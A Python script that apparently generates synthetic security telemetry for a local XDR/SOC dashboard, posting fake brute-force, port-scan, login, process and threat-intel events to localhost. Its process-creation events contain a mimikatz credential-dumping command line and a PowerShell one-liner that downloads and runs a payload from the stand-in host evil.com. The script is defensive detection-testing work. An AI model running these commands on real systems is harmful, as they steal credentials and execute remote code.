import urllib.request
import json
import time
from datetime import datetime, timezone

print("="*60)
print("        CYBERSHIELD XDR SOC TELEMETRY GENERATOR (PYTHON)")
print("="*60)

api_url = "http://127.0.0.1:8000/api/events/"

def send_event(payload):
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            api_url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return True
    except Exception as e:
        print(f"  [-] Failed to send event: {e}")
        return False

# 1. Generate Brute Force Alert
print("[*] Triggering Brute Force Attack alert on host 'win-dc-01'...")
for i in range(6):
    event = {
        "hostname": "win-dc-01",
        "ip_address": "192.168.1.10",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "failed_login",
        "source_ip": "198.51.100.42",
        "username": "administrator"
    }
    if send_event(event):
        print(f"  [+] Ingested failed login {i+1}/6")
    time.sleep(0.1)

# 2. Generate Port Scan Alert
print("[*] Triggering Port Scan Reconnaissance alert on host 'linux-srv-01'...")
for port in range(80, 92):
    event = {
        "hostname": "linux-srv-01",
        "ip_address": "192.168.1.50",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "network_connection",
        "source_ip": "203.0.113.15",
        "destination_port": port
    }
    if send_event(event):
        print(f"  [+] Ingested port probe on port {port}")
    time.sleep(0.1)

# 3. Generate Suspicious Login Success Alert
print("[*] Triggering Suspicious Success alert (3 failed then success) on 'win-dc-01'...")
for _ in range(3):
    event = {
        "hostname": "win-dc-01",
        "ip_address": "192.168.1.10",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "failed_login",
        "source_ip": "198.51.100.12",
        "username": "secops_lead"
    }
    send_event(event)
    time.sleep(0.1)

success_event = {
    "hostname": "win-dc-01",
    "ip_address": "192.168.1.10",
    "timestamp": datetime.now(timezone.utc).isoformat(),
    "event_type": "successful_login",
    "source_ip": "198.51.100.12",
    "username": "secops_lead"
}
send_event(success_event)
print("  [+] Ingested success sequence for user 'secops_lead'")

# 4. Generate Suspicious Process Spawns
print("[*] Triggering Suspicious Process Spawn alerts on 'win-workstation-11'...")
mimikatz_event = {
    "hostname": "win-workstation-11",
    "ip_address": "192.168.1.101",
    "timestamp": datetime.now(timezone.utc).isoformat(),
    "event_type": "process_creation",
    "process_name": "mimikatz.exe",
    "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
}
send_event(mimikatz_event)
print("  [+] Spawned credentials dumping tool: mimikatz.exe")

powershell_event = {
    "hostname": "win-workstation-11",
    "ip_address": "192.168.1.101",
    "timestamp": datetime.now(timezone.utc).isoformat(),
    "event_type": "process_creation",
    "process_name": "powershell.exe",
    "command_line": "powershell.exe -nop -bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
}
send_event(powershell_event)
print("  [+] Spawned bypass script: powershell.exe")

# 5. Generate Excessive Host Failures
print("[*] Triggering Excessive Host Failures alert on 'linux-database'...")
for i in range(22):
    event = {
        "hostname": "linux-database",
        "ip_address": "192.168.1.90",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": "failed_login",
        "source_ip": f"198.51.100.{i + 50}",
        "username": "root"
    }
    send_event(event)
    time.sleep(0.05)
print("  [+] Ingested 22 rapid auth failures against host 'linux-database'")

# 6. Threat Intel IOC connection
print("[*] Triggering Threat Intel Match alert on 'linux-srv-01'...")
intel_event = {
    "hostname": "linux-srv-01",
    "ip_address": "192.168.1.50",
    "timestamp": datetime.now(timezone.utc).isoformat(),
    "event_type": "network_connection",
    "source_ip": "185.220.101.5",
    "destination_port": 443
}
send_event(intel_event)
print("  [+] Ingested connection to Command & Control IP: 185.220.101.5")

print("="*60)
print("        ALERTS GENERATION SUCCESSFUL!")
print("        Check the CyberShield XDR dashboard now.")
print("="*60)
